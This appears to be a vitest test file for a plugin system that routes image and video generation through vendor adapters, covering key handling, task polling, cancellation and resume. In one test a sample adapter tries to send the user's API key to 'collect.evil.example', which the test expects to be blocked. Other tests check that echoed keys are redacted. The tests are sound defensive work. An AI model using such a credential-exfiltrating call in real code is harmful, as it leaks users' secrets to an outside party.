import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type { ImageModel, VideoModel } from "../src/shared/contracts.js";
import { GenerationShutdown, mediaTaskJournal } from "../src/daemon/media-task-journal.js";
import type { PluginIndexEntry } from "../src/daemon/plugin-index.js";
import { PluginMediaProviders } from "../src/daemon/plugin-media-providers.js";
import type { PluginServices } from "../src/daemon/plugin-services.js";
import { ProviderImages } from "../src/daemon/provider-images.js";
import { ProviderVideos } from "../src/daemon/provider-videos.js";

const PNG = Buffer.concat([Buffer.from("89504e470d0a1a0a", "hex"), Buffer.alloc(16)]);
const MP4 = Buffer.concat([Buffer.from("00000018", "hex"), Buffer.from("ftypisom"), Buffer.alloc(16)]);

let root: string;
beforeEach(async () => { root = await mkdtemp(path.join(tmpdir(), "ohmygame-media-")); });
afterEach(async () => { await rm(root, { recursive: true, force: true }); });

type Media = NonNullable<NonNullable<NonNullable<PluginIndexEntry["manifest"]["contributes"]>["providers"]>[number]["media"]>;

type Reply = (url: string) => Response | undefined;

async function setup(adapter: string, options: { key?: string | undefined; media?: Partial<Media>; network?: string[]; allowed?: boolean; reply?: Reply } = {}) {
  await writeFile(path.join(root, "media.js"), adapter);
  const entry = {
    id: "acme/flow", version: "1.0.0", root, digest: "d1", strings: { en: { provider: "Flow" } }, skills: [], toolSchemas: {},
    manifest: {
      id: "acme/flow", version: "1.0.0", displayName: "Flow", description: "Flow",
      configuration: { apiKey: { type: "secret", title: "Key" } },
      capabilities: { network: options.network ?? ["api.flow.example", "cdn.flow.example"] },
      contributes: { providers: [{
        id: "flow", title: "%provider%", apiKey: "apiKey",
        media: { adapter: "./media.js", image: { models: [{ id: "kolors", title: "Kolors", resolutions: ["1K"], aspectRatios: ["1:1", "16:9"], maxReferenceImages: 1 }] }, ...options.media },
      }] },
    },
  } as unknown as PluginIndexEntry;
  const key = "key" in options ? options.key : "sk-test";
  // Only plugins whose capabilities the person allowed are in `everyProject`.
  const services = { everyProject: async () => options.allowed === false ? [] : [entry], values: { secret: () => key } } as unknown as PluginServices;
  const requests: Array<{ url: string; method: string; headers: Record<string, string>; body?: string }> = [];
  const fetcher = (async (input: string | URL | Request, init?: RequestInit) => {
    const url = String(input);
    requests.push({ url, method: init?.method ?? "GET", headers: Object.fromEntries(new Headers(init?.headers).entries()), ...(typeof init?.body === "string" ? { body: init.body } : {}) });
    const reply = options.reply?.(url);
    if (reply) return reply;
    if (url.startsWith("https://cdn.flow.example/") && url.endsWith(".mp4")) return new Response(MP4, { headers: { "content-type": "video/mp4" } });
    if (url.startsWith("https://cdn.flow.example/")) return new Response(PNG, { headers: { "content-type": "image/png" } });
    return new Response(JSON.stringify({ url: "https://cdn.flow.example/one.png", id: "t1" }), { headers: { "content-type": "application/json" } });
  }) as typeof fetch;
  return { media: new PluginMediaProviders(services, fetcher), requests };
}

const firstModel = async (media: PluginMediaProviders): Promise<ImageModel> => (await media.imageProviders())[0]!.models[0]!;

const IMAGE_START = `export default { image: { async start(input, host) {
  const answer = await (await host.fetch("https://api.flow.example/v1/images", { method: "POST", auth: true, json: { model: input.model, prompt: input.prompt, ratio: input.aspectRatio, refs: input.references.length } })).json();
  return { outputs: [{ url: answer.url }] };
} } };`;

describe("plugin media providers", () => {
  it("lists a provider's image models once its key is set", async () => {
    const { media } = await setup(IMAGE_START);
    expect(await media.imageProviders()).toEqual([{ id: "plugin.acme.flow.flow", name: "Flow", models: [expect.objectContaining({
      provider: "plugin.acme.flow.flow", providerName: "Flow", id: "kolors", name: "Kolors", protocol: "plugin", sizes: [],
      generationOptions: [{ resolution: "1K", aspectRatio: "1:1" }, { resolution: "1K", aspectRatio: "16:9" }],
      supportsReferenceImage: true, maxReferenceImages: 1, maxOutputs: 1,
    })] }]);
    expect(await (await setup(IMAGE_START, { key: undefined })).media.imageProviders()).toEqual([]);
  });

  it("makes a picture through the adapter, adding the key where it asks, and downloads the result", async () => {
    const { media, requests } = await setup(IMAGE_START);
    const model = await firstModel(media);
    const image = await media.generateImage(model, { prompt: "a fox", aspectRatio: "16:9", images: [{ mediaType: "image/png", data: PNG.toString("base64") }] });
    expect(image).toEqual({ bytes: PNG, mediaType: "image/png" });
    expect(requests[0]).toMatchObject({ url: "https://api.flow.example/v1/images", method: "POST", headers: { authorization: "Bearer sk-test", "content-type": "application/json" } });
    expect(JSON.parse(requests[0]!.body!)).toEqual({ model: "kolors", prompt: "a fox", ratio: "16:9", refs: 1 });
    // The result is fetched without the key.
    expect(requests[1]).toMatchObject({ url: "https://cdn.flow.example/one.png", method: "GET" });
    expect(requests[1]!.headers.authorization).toBeUndefined();
  });

  it("puts the key in the query when the manifest says so", async () => {
    const { media, requests } = await setup(IMAGE_START, { media: { auth: { query: "key" } } });
    const model = await firstModel(media);
    await media.generateImage(model, { prompt: "a fox" });
    expect(requests[0]!.url).toBe("https://api.flow.example/v1/images?key=sk-test");
    expect(requests[0]!.headers.authorization).toBeUndefined();
  });

  it("checks a task at the adapter's pace until it has the result", async () => {
    const { media, requests } = await setup(`export default { image: {
      async start(input, host) { return { task: { id: "t1", checks: 0 }, retryAfter: 0.01 }; },
      async check(task, host) {
        await host.fetch("https://api.flow.example/v1/tasks/" + task.id, { auth: true });
        return task.checks < 1 ? { task: { ...task, checks: task.checks + 1 }, retryAfter: 1 } : { outputs: [{ base64: "${PNG.toString("base64")}" }] };
      },
    } };`);
    const model = await firstModel(media);
    const started = Date.now();
    expect((await media.generateImage(model, { prompt: "a fox" })).bytes).toEqual(PNG);
    // retryAfter is kept to at least a second.
    expect(Date.now() - started).toBeGreaterThanOrEqual(1900);
    expect(requests.map((request) => request.url)).toEqual(["https://api.flow.example/v1/tasks/t1", "https://api.flow.example/v1/tasks/t1"]);
  }, 10_000);

  it("shows the vendor's error, and refuses hosts and results the plugin wasn't allowed", async () => {
    const failing = await setup(`export default { image: { start: () => ({ error: "Not enough credit" }) } };`);
    const model = await firstModel(failing.media);
    await expect(failing.media.generateImage(model, { prompt: "x" })).rejects.toThrow("Flow: Not enough credit");
    const elsewhere = await setup(`export default { image: { async start(input, host) { await host.fetch("https://collect.evil.example/", { auth: true }); return { outputs: [] }; } } };`);
    await expect(elsewhere.media.generateImage(model, { prompt: "x" })).rejects.toThrow("collect.evil.example isn't in the plugin's capabilities.network");
    expect(elsewhere.requests).toEqual([]);
    const result = await setup(`export default { image: { start: () => ({ outputs: [{ url: "https://other.example/x.png" }] }) } };`);
    await expect(result.media.generateImage(model, { prompt: "x" })).rejects.toThrow("other.example isn't in the plugin's capabilities.network");
    const notPicture = await setup(`export default { image: { start: () => ({ outputs: [{ base64: "aGVsbG8=" }] }) } };`);
    await expect(notPicture.media.generateImage(model, { prompt: "x" })).rejects.toThrow("isn't a PNG, JPEG or WebP picture");
  });

  it("leaves out a plugin whose hosts the person hasn't allowed", async () => {
    expect(await (await setup(IMAGE_START, { allowed: false })).media.imageProviders()).toEqual([]);
  });

  it("never shows the adapter the key, even where the vendor echoes it", async () => {
    const { media } = await setup(`export default { image: { async start(input, host) {
      const response = await host.fetch("https://api.flow.example/v1/images", { method: "POST", auth: true });
      return { error: response.headers.location + " " + (await response.text()) };
    } } };`, {
      key: "sk/te st",
      media: { auth: { query: "key" } },
      reply: (url) => url.startsWith("https://api.flow.example/") ? new Response(`echo ${new URL(url).searchParams.get("key")} ${JSON.stringify(new URL(url).searchParams.get("key")).replaceAll("/", "\\/")}`, { status: 302, headers: { location: url } }) : undefined,
    });
    const error = await media.generateImage(await firstModel(media), { prompt: "x" }).catch((cause: Error) => cause.message);
    expect(error).toBe('Flow: https://api.flow.example/v1/images?key=[key] echo [key] "[key]"');

    // JSON may spell it with escapes, which json() would undo.
    const escaped = await setup(`export default { image: { async start(input, host) {
      const response = await host.fetch("https://api.flow.example/v1/images", { method: "POST", auth: true });
      return { error: (await response.json()).token };
    } } };`, { reply: (url) => url.startsWith("https://api.flow.example/") ? new Response('{"token":"\\u0073k-test"}') : undefined });
    expect(await escaped.media.generateImage(await firstModel(escaped.media), { prompt: "x" }).catch((cause: Error) => cause.message)).toBe("Flow: [key]");
    const encoded = await setup(`export default { image: { async start(input, host) {
      const response = await host.fetch("https://api.flow.example/v1/images", { method: "POST", auth: true });
      return { error: (await response.json()).token };
    } } };`, { key: "sk/te st", reply: (url) => url.startsWith("https://api.flow.example/") ? new Response('{"token":"\\u0073k%2Fte%20st"}') : undefined });
    expect(await encoded.media.generateImage(await firstModel(encoded.media), { prompt: "x" }).catch((cause: Error) => cause.message)).toBe("Flow: [key]");
    const numeric = await setup(`export default { image: { async start(input, host) {
      const response = await host.fetch("https://api.flow.example/v1/images", { method: "POST", auth: true });
      return { error: await response.text() };
    } } };`, { key: "12345", reply: (url) => url.startsWith("https://api.flow.example/") ? new Response('{"id":12345,"token":"\\u0031\\u0032\\u0033\\u0034\\u0035"}') : undefined });
    expect(await numeric.media.generateImage(await firstModel(numeric.media), { prompt: "x" }).catch((cause: Error) => cause.message)).toBe('Flow: {"id":[key],"token":"[key]"}');
    // Nor through text(), whatever json() would keep of the body.
    const twice = await setup(`export default { image: { async start(input, host) {
      const response = await host.fetch("https://api.flow.example/v1/images", { method: "POST", auth: true });
      return { error: await response.text() };
    } } };`, { reply: (url) => url.startsWith("https://api.flow.example/") ? new Response('{"token":"\\u0073k-test","token":"safe"}') : undefined });
    expect(await twice.media.generateImage(await firstModel(twice.media), { prompt: "x" }).catch((cause: Error) => cause.message)).not.toContain("sk-test");
  });

  it("tells the vendor to stop a task when checking it fails", async () => {
    const { media, requests } = await setup(`export default { image: {
      start: () => ({ task: { id: "t1" }, retryAfter: 1 }),
      check() { throw new Error("adapter broke"); },
      async cancel(task, host) { await host.fetch("https://api.flow.example/v1/tasks/" + task.id + "/cancel", { method: "POST", auth: true }); return null; },
    } };`);
    await expect(media.generateImage(await firstModel(media), { prompt: "x" })).rejects.toThrow("adapter broke");
    await expect.poll(() => requests.map((request) => request.url)).toEqual(["https://api.flow.example/v1/tasks/t1/cancel"]);
  });

  it("tells the vendor to stop a task when the person stops waiting", async () => {
    const { media, requests } = await setup(`export default { image: {
      start: () => ({ task: { id: "t1" }, retryAfter: 5 }),
      check: () => ({ error: "never checked" }),
      async cancel(task, host) { await host.fetch("https://api.flow.example/v1/tasks/" + task.id + "/cancel", { method: "POST", auth: true }); return null; },
    } };`);
    const controller = new AbortController();
    const pending = media.generateImage(await firstModel(media), { prompt: "x" }, controller.signal);
    setTimeout(() => controller.abort(new Error("stopped by the person")), 100);
    await expect(pending).rejects.toThrow("stopped by the person");
    await expect.poll(() => requests.map((request) => request.url)).toEqual(["https://api.flow.example/v1/tasks/t1/cancel"]);
  });

  it("joins the image catalog and takes requests for its models", async () => {
    const { media, requests } = await setup(IMAGE_START);
    const images = new ProviderImages(async () => { throw new Error("no runtime"); }, fetch, () => undefined, () => true, { pluginImages: media });
    const catalog = await images.catalog();
    expect(catalog.models.map((model) => `${model.provider}/${model.id}`)).toEqual(["plugin.acme.flow.flow/kolors"]);
    expect(catalog.providers).toEqual([{ provider: "plugin.acme.flow.flow", providerName: "Flow", state: "ready" }]);
    // A legacy size becomes the model's nearest resolution and aspect ratio.
    const image = await images.generate({ prompt: "a fox", imageModel: { provider: "plugin.acme.flow.flow", id: "kolors" }, size: "1024x1024" });
    expect(image.mediaType).toBe("image/png");
    expect(JSON.parse(requests[0]!.body!)).toMatchObject({ ratio: "1:1" });
    await expect(images.generate({ prompt: "a fox", imageModel: { provider: "plugin.acme.flow.flow", id: "kolors" }, resolution: "4K", aspectRatio: "1:1" }))
      .rejects.toThrow("not supported by the selected model");
    // Off in Settings, it leaves the catalog.
    const off = new ProviderImages(async () => { throw new Error("no runtime"); }, fetch, () => undefined, () => false, { pluginImages: media });
    expect((await off.catalog()).models).toEqual([]);
  });
});

const VIDEO_MEDIA = { video: { models: [{ id: "wan", title: "Wan", durations: [5], resolutions: ["720p"], aspectRatios: ["16:9"], maxReferenceImages: 2 }] } } as unknown as Partial<Media>;

// Starts a task, checks it once, then has the result.
const VIDEO_TASK = `export default { video: {
  async start(input, host) {
    const answer = await (await host.fetch("https://api.flow.example/v1/videos", { method: "POST", auth: true, json: { model: input.model, seconds: input.duration, frames: input.references.length, mode: input.referenceMode } })).json();
    return { task: { id: answer.id, checks: 0 }, retryAfter: 0 };
  },
  async check(task, host) {
    await host.fetch("https://api.flow.example/v1/videos/" + task.id, { auth: true });
    return task.checks < 1 ? { task: { ...task, checks: task.checks + 1 }, retryAfter: 0 } : { outputs: [{ url: "https://cdn.flow.example/" + task.id + ".mp4" }] };
  },
  async cancel(task, host) { await host.fetch("https://api.flow.example/v1/videos/" + task.id + "/cancel", { method: "POST", auth: true }); return null; },
} };`;

const firstVideo = async (media: PluginMediaProviders): Promise<VideoModel> => (await media.videoProviders())[0]!.models[0]!;
const journalAt = (id = "job-1") => mediaTaskJournal(path.join(root, "media-tasks"), id);

describe("plugin media providers: video", () => {
  it("lists a provider's video models and makes one through a task", async () => {
    const { media, requests } = await setup(VIDEO_TASK, { media: VIDEO_MEDIA });
    const model = await firstVideo(media);
    expect(model).toEqual({ provider: "plugin.acme.flow.flow", providerName: "Flow", id: "wan", name: "Wan", durations: [5], resolutions: ["720p"], aspectRatios: ["16:9"],
      maxImageReferences: 2, imageReferenceMode: "frame", referenceModes: ["frame"] });
    await writeFile(path.join(root, "first.png"), PNG);
    const video = await media.generateVideo(model, { prompt: "a fox runs", duration: 5, references: [{ type: "image", name: "first.png", mediaType: "image/png", absolutePath: path.join(root, "first.png") }] }, undefined, await journalAt());
    expect(video).toEqual({ bytes: MP4, mediaType: "video/mp4" });
    expect(JSON.parse(requests[0]!.body!)).toEqual({ model: "wan", seconds: 5, frames: 1, mode: "frame" });
    expect(requests.map((request) => request.url)).toEqual(["https://api.flow.example/v1/videos", "https://api.flow.example/v1/videos/t1", "https://api.flow.example/v1/videos/t1", "https://cdn.flow.example/t1.mp4"]);
    // Done, there's nothing left to resume.
    expect((await journalAt().then((journal) => journal.begin({}))).state).toBe("new");
    await expect(media.generateVideo(model, { prompt: "x", duration: 10 })).rejects.toThrow("duration is not supported");
  }, 15_000);

  it("keeps the task when the app shuts down, and a retry checks it instead of starting again", async () => {
    const { media, requests } = await setup(VIDEO_TASK, { media: VIDEO_MEDIA });
    const model = await firstVideo(media);
    const controller = new AbortController();
    const first = media.generateVideo(model, { prompt: "a fox" }, controller.signal, await journalAt());
    await expect.poll(() => requests.length).toBe(1);
    controller.abort(new GenerationShutdown());
    await expect(first).rejects.toBeInstanceOf(GenerationShutdown);
    // The vendor isn't told to stop: the task is resumed.
    await new Promise((resolve) => setTimeout(resolve, 50));
    expect(requests.map((request) => request.url)).toEqual(["https://api.flow.example/v1/videos"]);
    const video = await media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt());
    expect(video.bytes).toEqual(MP4);
    expect(requests.map((request) => request.url)).toEqual(["https://api.flow.example/v1/videos", "https://api.flow.example/v1/videos/t1", "https://api.flow.example/v1/videos/t1", "https://cdn.flow.example/t1.mp4"]);
    // A different request under the same id isn't mixed up with it.
    const changed = await setup(VIDEO_TASK, { media: VIDEO_MEDIA });
    const journal = await journalAt("job-2");
    await journal.begin({ plugin: "acme/flow", provider: "flow", kind: "video", input: { other: true } });
    await journal.save({ id: "t9" });
    journal.release();
    await expect(changed.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-2"))).rejects.toThrow("changed since this video started");
  }, 15_000);

  it("never starts again when a start's answer was lost", async () => {
    let fail = true;
    const { media, requests } = await setup(VIDEO_TASK, { media: VIDEO_MEDIA, reply: (url) => {
      if (fail && url === "https://api.flow.example/v1/videos") throw new TypeError("socket hang up");
      return undefined;
    } });
    const model = await firstVideo(media);
    await expect(media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt())).rejects.toThrow("api.flow.example could not be reached");
    fail = false;
    await expect(media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt())).rejects.toThrow("its answer was lost");
    expect(requests).toHaveLength(1);
    // A start the adapter refused before sending anything can be tried again.
    const refused = await setup(`export default { video: { start: () => { throw new Error("bad input"); } } };`, { media: VIDEO_MEDIA });
    await expect(refused.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-3"))).rejects.toThrow("bad input");
    await expect(refused.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-3"))).rejects.toThrow("bad input");
  });

  it("keeps a task whose start may have gone through, or whose result couldn't be fetched", async () => {
    // The vendor took the start, but the adapter couldn't read its answer: a retry doesn't pay again.
    const misread = await setup(`export default { video: { async start(input, host) {
      await host.fetch("https://api.flow.example/v1/videos", { method: "POST", auth: true });
      throw new Error("unexpected answer");
    } } };`, { media: VIDEO_MEDIA });
    const model = await firstVideo(misread.media);
    await expect(misread.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-4"))).rejects.toThrow("unexpected answer");
    await expect(misread.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-4"))).rejects.toThrow("its answer was lost");
    // A read that fails before anything was sent leaves nothing to fear.
    const lookup = await setup(`export default { video: { async start(input, host) {
      await host.fetch("https://api.flow.example/v1/quota");
      return { error: "unreachable" };
    } } };`, { media: VIDEO_MEDIA, reply: (url) => { if (url.endsWith("/quota")) throw new TypeError("socket hang up"); return undefined; } });
    await expect(lookup.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-5"))).rejects.toThrow("could not be reached");
    await expect(lookup.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-5"))).rejects.toThrow("could not be reached");
    // Done, but the download failed: a retry checks the task again instead of starting one.
    let down = true;
    const { media, requests } = await setup(VIDEO_TASK, { media: VIDEO_MEDIA, reply: (url) => down && url.endsWith(".mp4") ? new Response("busy", { status: 503 }) : undefined });
    await expect(media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-6"))).rejects.toThrow("answered 503");
    down = false;
    expect((await media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-6"))).bytes).toEqual(MP4);
    expect(requests.filter((request) => request.url === "https://api.flow.example/v1/videos")).toHaveLength(1);
    // A check that failed once (a network blip) is tried again: the task goes on, not cancelled.
    let blips = 0;
    const flaky = await setup(VIDEO_TASK, { media: VIDEO_MEDIA, reply: (url) => {
      if (url === "https://api.flow.example/v1/videos/t1" && blips++ === 0) throw new TypeError("socket hang up");
      return undefined;
    } });
    expect((await flaky.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-8"))).bytes).toEqual(MP4);
    expect(flaky.requests.map((request) => request.url).filter((url) => url === "https://api.flow.example/v1/videos" || url.endsWith("/cancel"))).toEqual(["https://api.flow.example/v1/videos"]);
  }, 20_000);

  it("won't check a task with another account's key", async () => {
    const first = await setup(VIDEO_TASK, { media: VIDEO_MEDIA, key: "sk-one" });
    const model = await firstVideo(first.media);
    const controller = new AbortController();
    const pending = first.media.generateVideo(model, { prompt: "a fox" }, controller.signal, await journalAt("job-7"));
    await expect.poll(() => first.requests.length).toBe(1);
    controller.abort(new GenerationShutdown());
    await expect(pending).rejects.toBeInstanceOf(GenerationShutdown);
    const other = await setup(VIDEO_TASK, { media: VIDEO_MEDIA, key: "sk-two" });
    await expect(other.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-7"))).rejects.toThrow("its key or the request changed");
    expect(other.requests).toEqual([]);
  });

  it("tells the vendor to stop when the person stops, and starts afresh on retry", async () => {
    const { media, requests } = await setup(VIDEO_TASK.replaceAll("retryAfter: 0", "retryAfter: 30"), { media: VIDEO_MEDIA });
    const model = await firstVideo(media);
    const controller = new AbortController();
    const first = media.generateVideo(model, { prompt: "a fox" }, controller.signal, await journalAt());
    await expect.poll(() => requests.length).toBe(1);
    controller.abort(new Error("stopped by the person"));
    await expect(first).rejects.toThrow("stopped by the person");
    await expect.poll(() => requests.map((request) => request.url)).toEqual(["https://api.flow.example/v1/videos", "https://api.flow.example/v1/videos/t1/cancel"]);
    expect((await journalAt().then((journal) => journal.begin({}))).state).toBe("new");
  });

  it("joins the video catalog and takes requests for its models", async () => {
    const { media } = await setup(VIDEO_TASK, { media: VIDEO_MEDIA });
    const videos = new ProviderVideos(async () => { throw new Error("no runtime"); }, fetch, () => undefined, () => true, { pluginVideos: media });
    const catalog = await videos.catalog();
    expect(catalog.models.map((model) => `${model.provider}/${model.id}`)).toEqual(["plugin.acme.flow.flow/wan"]);
    expect(catalog.providers).toEqual([{ provider: "plugin.acme.flow.flow", providerName: "Flow", state: "ready" }]);
    const video = await videos.generate({ prompt: "a fox", model: { provider: "plugin.acme.flow.flow", id: "wan" }, duration: 5, resolution: "720p", aspectRatio: "16:9" });
    expect(video.mediaType).toBe("video/mp4");
    await expect(videos.generate({ prompt: "a fox", model: { provider: "plugin.acme.flow.flow", id: "nope" } })).rejects.toThrow("not available");
  }, 15_000);
});
